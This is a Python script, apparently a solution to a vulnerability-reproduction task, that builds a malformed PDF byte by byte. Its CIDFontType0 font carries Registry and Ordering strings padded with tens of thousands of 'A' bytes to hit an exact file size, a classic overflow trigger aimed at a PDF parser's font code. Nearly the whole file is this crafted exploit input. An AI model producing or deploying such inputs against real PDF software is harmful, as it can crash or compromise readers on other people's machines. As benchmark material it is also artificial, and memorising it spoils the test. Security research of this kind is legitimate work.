class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b"%PDF-1.4\n"
        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n\n"
        obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n\n"
        obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>\nendobj\n\n"
        contents = b"BT /F1 12 Tf 100 700 Td (Hello) Tj ET\n"
        len4 = len(contents)
        obj4_start = b"4 0 obj\n<< /Length " + str(len4).encode() + b" >>\nstream\n"
        obj4_end = b"endstream\nendobj\n\n"
        obj4 = obj4_start + contents + obj4_end
        basefont = b"/NoSuchFont"
        cidsys_fixed_start = b"<< /Registry "
        cidsys_fixed_mid = b" /Ordering "
        cidsys_fixed_end = b" /Supplement 0 >>"
        w = b"\n/W []"
        dw = b"\n/DW 1000"
        desc_fonts = b"\n/DescendantFonts [6 0 R]"
        font_desc = b"\n/FontDescriptor 7 0 R"
        obj5_fixed_start = b"5 0 obj\n<< /Type /Font /Subtype /CIDFontType0 /BaseFont " + basefont + b"\n"
        registry0 = b"()"
        ordering0 = b"()"
        obj5_0 = obj5_fixed_start + cidsys_fixed_start + registry0 + cidsys_fixed_mid + ordering0 + cidsys_fixed_end + w + dw + desc_fonts + font_desc + b"\n>>\nendobj\n\n"
        obj6 = b"6 0 obj\n<< /Type /Font /Subtype /CIDFontType2 /BaseFont " + basefont + b" /CIDToGIDMap /Identity >>\nendobj\n\n"
        obj7 = b"7 0 obj\n<< /Type /FontDescriptor /FontName " + basefont + b"\n/Flags 4 /FontBBox [0 0 1000 1000] /ItalicAngle 0 /Ascent 800 /Descent -200 /CapHeight 700 /StemV 80 >>\nendobj\n\n"
        body0 = header + obj1 + obj2 + obj3 + obj4 + obj5_0 + obj6 + obj7
        pos0 = len(header)
        positions0 = []
        for o in [obj1, obj2, obj3, obj4, obj5_0, obj6, obj7]:
            positions0.append(pos0)
            pos0 += len(o)
        xref0 = b"xref\n0 8\n0000000000 65535 f \n"
        for p in positions0:
            p_str = f"{p:010d}".encode()
            xref0 += p_str + b" 00000 n \n"
        trailer0 = b"trailer\n<< /Size 8 /Root 1 0 R >>\n"
        startxref0 = b"startxref\n" + str(pos0).encode() + b"\n%%EOF\n"
        full0 = body0 + xref0 + trailer0 + startxref0
        size0 = len(full0)
        target = 80064
        add = target - size0
        pl = max(0, add // 2)
        payload = b"A" * pl
        registry = b"(" + payload + b")"
        ordering = b"(" + payload + b")"
        obj5 = obj5_fixed_start + cidsys_fixed_start + registry + cidsys_fixed_mid + ordering + cidsys_fixed_end + w + dw + desc_fonts + font_desc + b"\n>>\nendobj\n\n"
        body = header + obj1 + obj2 + obj3 + obj4 + obj5 + obj6 + obj7
        pos = len(header)
        positions = []
        for o in [obj1, obj2, obj3, obj4, obj5, obj6, obj7]:
            positions.append(pos)
            pos += len(o)
        xref = b"xref\n0 8\n0000000000 65535 f \n"
        for p in positions:
            p_str = f"{p:010d}".encode()
            xref += p_str + b" 00000 n \n"
        trailer = b"trailer\n<< /Size 8 /Root 1 0 R >>\n"
        startxref = b"startxref\n" + str(pos).encode() + b"\n%%EOF\n"
        full = body + xref + trailer + startxref
        return full